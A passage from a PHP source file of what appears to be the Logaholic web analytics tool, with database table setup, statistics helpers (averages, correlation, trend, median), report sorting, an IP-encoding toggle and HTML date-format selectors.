            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
		
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_visitorids} ADD UNIQUE INDEX {$profile->tablename_visitorids}_visitorid (visitorid)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_visitorids}_visitorid on {$profile->tablename_visitorids}(visitorid)");
        }
        
		// $db->Execute("ALTER TABLE {$profile->tablename_visitorids} ADD INDEX (hash)");
    }
    if (!in_array_insensitive($profile->tablename_sessionids, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_sessionids (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "sessionid varchar(32) NOT NULL default '0'".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_sessionids} ADD INDEX {$profile->tablename_sessionids}_sessionid (sessionid)");
        } else {
           $db->Execute("CREATE INDEX {$profile->tablename_sessionids}_sessionid on {$profile->tablename_sessionids}(sessionid)");
        }
        
    }
    // sessionid table isn't used anymore
    if (!in_array_insensitive($profile->tablename_screenres, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_screenres (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "timestamp int(11) NOT NULL default '0',".
            "screenres varchar(20) NOT NULL default '',".
            "visits bigint(100) NOT NULL default '0'".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_screenres} ADD UNIQUE INDEX {$profile->tablename_screenres}_dayres (timestamp,screenres)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_screenres}_dayres on {$profile->tablename_screenres}(timestamp,screenres)");
        }
    }
    if (!in_array_insensitive($profile->tablename_colordepth, $meta_tables)) {
        $db->Execute("CREATE TABLE $profile->tablename_colordepth (".
            "id ". (($databasedriver != "sqlite") ? "int(11) NOT NULL auto_increment" : "integer primary key") . ", ".
            "timestamp int(11) NOT NULL default '0',".
            "colordepth varchar(20) NOT NULL default '',".
            "visits bigint(100) NOT NULL default '0'".
            (($databasedriver != "sqlite") ? ", PRIMARY KEY (id)" : "").
        ") ENGINE=MyISAM CHARSET=utf8");
        if ($databasedriver == "mysql") {
            $db->Execute("ALTER TABLE {$profile->tablename_colordepth} ADD UNIQUE INDEX {$profile->tablename_colordepth}_daycolor (timestamp,colordepth)");
        } else {
            $db->Execute("CREATE UNIQUE INDEX {$profile->tablename_colordepth}_daycolor on {$profile->tablename_colordepth}(timestamp,colordepth)");
        }
        
    }
    if (!in_array_insensitive($profile->tablename_useragents, $meta_tables)) {
		$db->Execute("CREATE TABLE IF NOT EXISTS `{$profile->tablename_useragents}` (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `name` varchar(255) DEFAULT NULL,
			  `version` varchar(255) DEFAULT NULL,
			  `os` varchar(255) DEFAULT NULL,
			  `os_version` varchar(255) DEFAULT NULL,
			  `engine` varchar(255) DEFAULT NULL,
			  `useragent` text,
			  `is_bot` int(1) NOT NULL default '0',
			  `is_mobile` int(1) NOT NULL default '0',
			  `device` varchar(255) DEFAULT NULL,
			  `hash` CHAR(32) NOT NULL default '0',
			  PRIMARY KEY (`id`),
			  UNIQUE KEY `hash` (`hash`)
			) ENGINE=MyISAM DEFAULT CHARSET=utf8;");
    }
    $profile->structure_version = CURRENT_PROFILE_STRUCTURE_VERSION;
	$profile->Save();	
    
}

function getAverage($data) {
	if(!empty($data)) {
		return (array_sum($data)/count($data));
	} else {
		return false;
	}
}
function getStandardDev($data) {
	if(!empty($data)) {
		$x_avg = getAverage($data);
		$n = count($data);
		foreach($data as $k=>$v) {
			$x_minus_avg[] = pow(($v - $x_avg),2);
		}
		$sigma = array_sum($x_minus_avg);
		$lastpart = ($sigma / ($n - 1));
		
		$return = sqrt($lastpart);
		return $return;
	} else {
		return false;
	}
}
function getCorrelation($data) {
	if(!empty($data)) {
		$i = 0;
		foreach($data as $k=>$v) {
			$days[] = $i++;
			$values[] = $v;
		}
		$n = count($data);
		if($n ==1){
			return false;
		}
		$day_avg = getAverage($days);
		$day_std = getStandardDev($days);
		$val_avg = getAverage($values);
		$val_std = getStandardDev($values);
		
		$x = 0;
		foreach($data as $k=>$v) {
			$x_part = ($days[$x] - $day_avg);
			$y_part = ($v - $val_avg);
			$e_part[] = ($x_part * $y_part); // stands for the mathematical E (sigma)
			$x++;
		}
		$e = array_sum($e_part); // mathematical E
		
		$lastpart = @($e / ($day_std * $val_std));
		$final = ($lastpart / ($n - 1));
		
		return $final;
	} else {
		return false;
	}
}
function getTrend($data,$keycol="") {
	$i = 0;
		
	foreach($data as $k => $v) {
		$days[] = $i;
		if ($keycol!="") {
			$values[] = $v[$keycol];
		} else {
			$values[] = $v;
		}
		
		$i++;
	}
	
	if($i == 1) { return false; }
	
	$day_std = getStandardDev($days);
	$val_std = getStandardDev($values);
	
	$r = getCorrelation($values);
	
	if ($day_std != 0) {
		$result = number_format((($val_std / $day_std) * $r),2,".","");
	} else {
		$result = 0;
	}
	
	return $result;
}
function zeroFill($data) {
	global $showfields,$from,$to;
	$headers = explode(",",$showfields);
	
	$n = (($to-$from) / 86400);
	$i=0;
	
	//This loop will fill a link array so we know which index belongs to which date.
	foreach ($data as $row) {
		$days[$row[0]]=$i;
		$i++;
	}
	
	// We will fill an empty array for each day.
	for($i = 0; $i < $n; $i++) {
		$ii = 0;
		foreach($headers as $header) {
			if($header == _DATE) {
				$datecol = $ii;
				$newdata[$i][$ii]=date('d-M-Y D',($from + ($i * 86400)));
			} else {
				$newdata[$i][$ii]=0;
			}
			$ii++;
		}
	}
	
	if(!isset($datecol)) { $datecol = 0; }
	
	// We merge the data into a new data array.
	$i=0;
	foreach($newdata as $row) {		
		if (isset($days[$row[$datecol]])) {			
			if ($row[$datecol]==$data[$days[$row[$datecol]]][$datecol]) {
				$newdata[$i] = $data[$days[$row[$datecol]]];
			}
		}
		$i++;
	}
	return $newdata;
}     
function getStartDate($conf) {
	global $profile, $from, $to, $db;
	
	if(!isset($profile)) {
		$earliestdate = mktime(0,0,0,01,01,1998);
	} else {
		$dq = "SELECT timestamp FROM {$profile->tablename} LIMIT 1";
		$result = @$db->Execute($dq);
		if($data = $result->FetchRow()) {
			$earliestdate = $data['timestamp'];
		} else {
			$earliestdate = mktime(0,0,0,01,01,1998);
		}
	}
	
	return $earliestdate;
}

function uniqueDefine($label, $definition) {
	if(!defined($label)) {
		define($label, $definition);
	}
}

function makeMapXMLstr($conf,$from,$to,$trafficsource="",$limit=100) {
    /**
    * @desc This function creates the string of source urls that is required by the Flash World Map component
    */
    
    # xml1=http%3A%2F%2Fwww.logaholic.nl%2Floga30fab%2Fv4%2Freports.php%3Fconf%3Dtechsupport%26to%3D1272405599%26from%3D1270072800%26labels%3DTop%2520Continents%26limit%3D100%26submit%3DReport%26xml%3D1&xml2=http%3A%2F%2Fwww.logaholic.nl%2Floga30fab%2Fv4%2Freports.php%3Fconf%3Dtechsupport%26to%3D1272405599%26from%3D1270072800%26labels%3DTop%2520Countries%2520%2F%2520Cities%26submit%3DReport%26xml%3D1&xml3=http%3A%2F%2Fwww.logaholic.nl%2Floga30fab%2Fv4%2Freports.php%3Fconf%3Dtechsupport%26from%3D1270072800%26to%3D1272578399%26submit%3DReport%26labels%3DTop%2520Cities%2520Map%26xml%3D1%26country%3D
    
    # Top continents
    $xml1 = "reports.php?conf=$conf&labels=_TOP_CONTINENTS&from=$from&to=$to&limit=100&outputmode=xml";
    
    # Top Countries
    $xml2 = "reports.php?conf=$conf&labels=_TOP_COUNTRIES_CITIES&from=$from&to=$to&limit=100&outputmode=xml";
    
	if(!empty($_SESSION['new_ui'])) {
    # Top Cities
		$xml3 = "reports.php?conf=$conf&labels=_TOP_CITIES&from=$from&to=$to&limit=100&outputmode=xml&country=";
	} else {
		$xml3 = "reports.php?conf=$conf&labels=Top Cities Map&from=$from&to=$to&limit=100&outputmode=xml&country=";
	}
	
	if(!empty($trafficsource)) {
		$xml1 .= "&trafficsource={$trafficsource}";
		$xml2 .= "&trafficsource={$trafficsource}";
		$xml3 .= "&trafficsource={$trafficsource}";
	}
    
    if (isset($debug)) {
        // echoWarning("Map urls:<ul><li>$xml1</li><li>$xml2</li><li>$xml3</li></ul>");
        echoDebug("Map urls:<ul><li>$xml1</li><li>$xml2</li><li>$xml3</li></ul>");
    }
    
    # send back the whole thing
    $str = "xml1=".urlencode($xml1)."&xml2=".urlencode($xml2)."&xml3=".urlencode($xml3);
    return $str;
}     

function lgflush() {
    ob_flush();
    flush();
    ob_end_flush();
    ob_start();    
}

/**
* @desc This function takes the data array that is used to create report tables,
* grabs a single column from it and passes that back as a one-dimensional array  
*/
function ColumnArray($data,$col) {
    $a = array();
    foreach ($data as $row) {
        $a[] = $row[$col];
    }
    return $a;   
} 

/**
* @desc This function calculates the median value from an array of values.
* Input must be a one-dimensional array with numbered keys
*/
function median($num_array) {
    sort($num_array);    
    $median_item=((count($num_array)+1)/2)-1;  // minus one because array keys start at 0
    //echo "there are ".count($num_array)." items, the median item is ".($median_item+1).", which is array key $median_item";
    if (is_int($median_item)) {
        return $num_array[$median_item];    
    } else {
        $l = ($median_item-0.5);
        $h = ($median_item+0.5);
        $median=($num_array[$l]+$num_array[$h])/2;
        return $median;    
    }
}

/**
* @desc This function returns the maximum date range for a given profile
* i.e. the oldest date in the database as 'from' and the most recent date as 'to'
* @returns array containing from and to as keys
*/
function GetMaxDateRange($profile) {
    global $db;
    $range = array();
    $q  = "select timestamp from $profile->tablename order by timestamp limit 1";
    $r = $db->Execute($q);
    $data=$r->FetchRow();
    $range['from'] = $data['timestamp'];
    
    $q  = "select timestamp from $profile->tablename order by timestamp desc limit 1";  
    $r = $db->Execute($q);
    $data=$r->FetchRow();
    $range['to'] = $data['timestamp'];
    
    return $range;           
}

/**
* @desc This function will enable or disable the ipencoding setting in the global.php file
*/
function toggleIPencoding() {
    global $ipencoding;
    $s = file_get_contents("files/global.php");
    # check if we already have the setting
    if (isset($ipencoding)) {
        if ($ipencoding==true) {
            $s = str_replace("ipencoding=true","ipencoding=false",$s);
            $msg = "IP encoding has been disabled! <br><br><b>Important:</b> If traffic was imported when IP encoding was enabled, those visitors will still have encoded IP numbers. We do not recommend switching IP encoding on and off in a live system. Just choose one settings and leave it that way.";
        } else {
            $s = str_replace("ipencoding=false","ipencoding=true",$s);
            $msg = "IP encoding has been enabled!";
        }
    } else {
        # if the setting was not present to begin with, we know we now have to enable it
        $s = str_replace("?>","\$ipencoding=true;\n?>",$s);
        $msg = "IP encoding has been enabled!";
    }
    if (file_put_contents("files/global.php",$s)===false) {
        return false;
    } else {
        return $msg;    
    }        
}

/**
* @desc This functions takes a path and makes sure we only use forward slashes and adds a slash at the end if it's not there
*/
function properSlash($path) {
    $path = str_replace("\\","/",$path);
    if (substr($path,-1)!="/") {
        $path.="/";
    }
    return $path;    
}

/**
* @desc This function sorts any multidimensional array on the selected row 
*/
function DataSort($data,$sort_row,$order=SORT_DESC) {
    foreach ($data as $key => $row) {
        $sortkey[$key] = $row[$sort_row];
    }
	if (is_array($sortkey)) {
		array_multisort($sortkey, $order, $data);
	}
    return $data;
}

/**
* @desc Check if any maintenance is needed
*/
function housekeeping() {
	global $profile, $loginSystemExists;
	//ob_start();
	// Does the current profile need to be updated?	
	if (isset($profile)) {
		if ($profile->profileloaded) {
			// make sure the profile is of adequate version to be used.
			if ($profile->structure_version < CURRENT_PROFILE_STRUCTURE_VERSION) {
				include_once "version_check.php";
				updateDataTableForProfile($profile);
				$profile->Load($profile->profilename); // Load the profile again to apply any changes
			}
		}
	}
	//$content = ob_get_contents();
	//ob_end_flush();
	//return $content;
}

/**
* @desc SORT OUT THE REPORT CATEGORYS AND THE REPORTS INSIDE THE CATEGORY
*/
function sort_reports($reports) {
	// first of all, we want to set an order for all known report categories
	$cat_order[] = "_VISITOR_DETAILS";
	$cat_order[] = "_POPULAR_CONTENT";
	$cat_order[] = "_INCOMING_TRAFFIC";
	$cat_order[] = "_PERFORMANCE";	
	$cat_order[] = "_CLIENT_SYSTEM";
	$cat_order[] = "_TRAFFIC";
	$cat_order[] = "_SOCIAL_MEDIA";
	$cat_order[] = "_FACEBOOK_FRIENDS";
	$cat_order[] = "_FACEBOOK_APPS_PAGES";

	// next, split the reports array into seperate arrays, one for each category
	$cat_reports = array();
	foreach($reports as $key => $val) {
		$cat_reports[$val["Category"]][$key] = $val;
		// in case there are any categories we don't know about, make sure to add them to the end of the cat_order array
		if (!in_array($val["Category"],$cat_order)) { $cat_order[] = $val["Category"]; }
	}
	
	// now, sort the reports inside each category by the order element
	foreach($cat_reports as $cat => $report_array) {
		// since we can't be sure each report actually has an Order element, we have to verify them
		$report_array = verifyOrderReports($report_array);
		$new_reports[$cat] = DataSort($report_array, "Order", SORT_ASC);
	}
	
	// merge it all back together using the right category order
	$reports = array();
	foreach($cat_order as $cat) {
		if(!empty($new_reports[$cat])) {
			$reports = array_merge($reports,$new_reports[$cat]);
		}
	}
	
	return $reports;
}

function verifyOrderReports($reports) {	
	// find the max value
	$max = multimax($reports,"Order");
	// now fill her up
	$verified = array();
	foreach($reports as $key => $value) {
		if (!isset($value["Order"])) { $value["Order"] = $max++; }
		$verified[$key] = $value;
	}
	return $verified;
}

/**
* @desc this function returns the max value from a multidemensional array, for the given key
*/
function multimax($array, $key) {
	$max = 0;
	foreach($array as $val) {
		if (isset($val[$key]) > $max) { $max = $val[$key]; }
	}
	return $max;
}

function setSessionVar($key, $val){
	Logaholic_sessionStart();
	$_SESSION[$key] = $val;
	session_write_close();
}


function objectToArray($d) {
	if (is_object($d)) {
		$d = get_object_vars($d);
	}
	
	if (is_array($d)) {
		return array_map(__FUNCTION__, $d);
	} else {
		// Return array
		return $d;
	}
}

function dump($var) {
	echo "<pre>";
	print_r($var);
	echo "</pre>";
}

function logaholic_baseurl() {
	if(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
		$protocol = "https://";
	} else {
		$protocol = "http://";
	}
	$base_url = explode("/", $protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
	unset($base_url[count($base_url) - 1]);

	if (@file_exists("version_check.php")) {
		//we're in the base folder
		$cd="";
	} else {
		if (@file_exists("../version_check.php")) {
			//we're in a sub folder
			$cd="../";
			unset($base_url[count($base_url) - 1]);
		} else {
			if (@file_exists("../../version_check.php")) {
				//we're in a sub sub folder
				$cd="../../";
				unset($base_url[count($base_url) - 1]);
				unset($base_url[count($base_url) - 1]);
			} else {
				return false;
			}
		}
	}
	
	$base_url = implode("/", $base_url);

	return $base_url."/";
}

function stdToAssoc($obj) {
	$array = array();
	
	foreach($obj as $key => $value) {
		if(is_object($value) == true || is_array($value) == true) {
			$array[$key] = stdToAssoc($value);
		} else {
			$array[$key] = $value;
		}
	}
	
	return $array;
}

function getReportArray() {
	$path = logaholic_dir() . "reports/";
	$report_dir = opendir($path);
	while ($file = readdir($report_dir)) {
		if (strpos($file,".php")!==false) {
			$str = file_get_contents($path . $file);
			$str = substr($str,strpos($str,"\$reports["));
			$str = substr($str,0,(strpos($str,");")+2));
			eval($str);
		}	
	}
	closedir($report_dir);
	return $reports;
}
function SetupCustomDateFormat($timeformat){
	if(empty($timeformat)) {
		$timeformat = array(
			"format1" => "m",
			"seperator1" => "-",
			"format2" => "d",
			"seperator2" => "-",
			"format3" => "Y",
			"seperator3" => " ",
			"format4" => ""				
		);
	}
	?>			
	<select class="format1" name="format1">
		<option value="d" <?php if($timeformat["format1"] == "d"){ echo 'selected="selected"'; } ?>>Day (31)</option>
		<option value="D" <?php if($timeformat["format1"] == "D"){ echo 'selected="selected"'; } ?>>Day (Mon)</option>
		<option value="m" <?php if($timeformat["format1"] == "m"){ echo 'selected="selected"'; } ?>>Month (12)</option>
		<option value="M" <?php if($timeformat["format1"] == "M"){ echo 'selected="selected"'; } ?>>Month (Dec)</option>
		<option value="Y" <?php if($timeformat["format1"] == "Y"){ echo 'selected="selected"'; } ?>>Year</option>
		<option value="" <?php if($timeformat["format1"] == ""){ echo 'selected="selected"'; } ?>>None</option>
	</select>
	<select class="seperator1" name="seperator1">
		<option value=" " <?php if($timeformat["seperator1"] == " "){ echo 'selected="selected"'; } ?>> </option>
		<option value="-" <?php if($timeformat["seperator1"] == "-"){ echo 'selected="selected"'; } ?>>-</option>
		<option value="/" <?php if($timeformat["seperator1"] == "/"){ echo 'selected="selected"'; } ?>>/</option>
		<option value="," <?php if($timeformat["seperator1"] == ","){ echo 'selected="selected"'; } ?>>, </option>
	</select>
	<select class="format2" name="format2">
		<option value="d" <?php if($timeformat["format2"] == "d"){ echo 'selected="selected"'; } ?>>Day (31)</option>
		<option value="D" <?php if($timeformat["format2"] == "D"){ echo 'selected="selected"'; } ?>>Day (Mon)</option>
		<option value="m" <?php if($timeformat["format2"] == "m"){ echo 'selected="selected"'; } ?>>Month (12)</option>
		<option value="M" <?php if($timeformat["format2"] == "M"){ echo 'selected="selected"'; } ?>>Month (Dec)</option>
		<option value="Y" <?php if($timeformat["format2"] == "Y"){ echo 'selected="selected"'; } ?>>Year</option>
		<option value="" <?php if($timeformat["format2"] == ""){ echo 'selected="selected"'; } ?>>None</option>
	</select>
	<select class="seperator2" name="seperator2">
		<option value=" " <?php if($timeformat["seperator2"] == " "){ echo 'selected="selected"'; } ?>> </option>
		<option value="-" <?php if($timeformat["seperator2"] == "-"){ echo 'selected="selected"'; } ?>>-</option>
		<option value="/" <?php if($timeformat["seperator2"] == "/"){ echo 'selected="selected"'; } ?>>/</option>
		<option value="," <?php if($timeformat["seperator2"] == ","){ echo 'selected="selected"'; } ?>>, </option>
	</select>
	<select class="format3" name="format3">
		<option value="d" <?php if($timeformat["format3"] == "d"){ echo 'selected="selected"'; } ?>>Day (31)</option>
		<option value="D" <?php if($timeformat["format3"] == "D"){ echo 'selected="selected"'; } ?>>Day (Mon)</option>
		<option value="m" <?php if($timeformat["format3"] == "m"){ echo 'selected="selected"'; } ?>>Month (12)</option>
		<option value="M" <?php if($timeformat["format3"] == "M"){ echo 'selected="selected"'; } ?>>Month (Dec)</option>
		<option value="Y" <?php if($timeformat["format3"] == "Y"){ echo 'selected="selected"'; } ?>>Year</option>
		<option value="" <?php if($timeformat["format3"] == ""){ echo 'selected="selected"'; } ?>>None</option>
	</select>
	<select class="seperator3" name="seperator3">
		<option value=" " <?php if($timeformat["seperator3"] == " "){ echo 'selected="selected"'; } ?>> </option>
		<option value="-" <?php if($timeformat["seperator3"] == "-"){ echo 'selected="selected"'; } ?>>-</option>
		<option value="/" <?php if($timeformat["seperator3"] == "/"){ echo 'selected="selected"'; } ?>>/</option>
		<option value="," <?php if($timeformat["seperator3"] == ","){ echo 'selected="selected"'; } ?>>, </option>
	</select>
	<select class="format4" name="format4">
		<option value="d" <?php if($timeformat["format4"] == "d"){ echo 'selected="selected"'; } ?>>Day (31)</option>
		<option value="D" <?php if($timeformat["format4"] == "D"){ echo 'selected="selected"'; } ?>>Day (Mon)</option>
		<option value="m" <?php if($timeformat["format4"] == "m"){ echo 'selected="selected"'; } ?>>Month (12)</option>
		<option value="M" <?php if($timeformat["format4"] == "M"){ echo 'selected="selected"'; } ?>>Month (Dec)</option>
		<option value="Y" <?php if($timeformat["format4"] == "Y"){ echo 'selected="selected"'; } ?>>Year</option>
		<option value="" <?php if($timeformat["format4"] == ""){ echo 'selected="selected"'; } ?>>None</option>
	</select>
	<?php
}
$phpdatepicker_date_format = array(
"d" => "dd"
,"D" => "D"
,"m" => "mm"
,"M" => "M"
,"Y" => "yy"
);
function GetCustomDateFormat($script = "PHP", $returnasarray = FALSE){
	global $dateFormat,$profile,$phpdatepicker_date_format;
	/// returns a date string
	if(!isset($profile->profilename)) {
		$date = getGlobalSetting("profileDateFormat",$dateFormat);
	} else {
		$date = getProfileData($profile->profilename, $profile->profilename.".profileDateFormat", getGlobalSetting("profileDateFormat",$dateFormat));
	}
	$date = unserialize($date);
	if($returnasarray == TRUE){
		return $date;
	}
	$ds = "";
	foreach($date as $k => $v){
		if($script == "PHP"){
			$ds .= $v;
		}
		if($script == "JS"){
			if(array_key_exists($v,$phpdatepicker_date_format)){
				$ds .= $phpdatepicker_date_format[$v];
			} else {
				$ds .= $v;
			}
		}
	}
	return trim($ds);
}
?>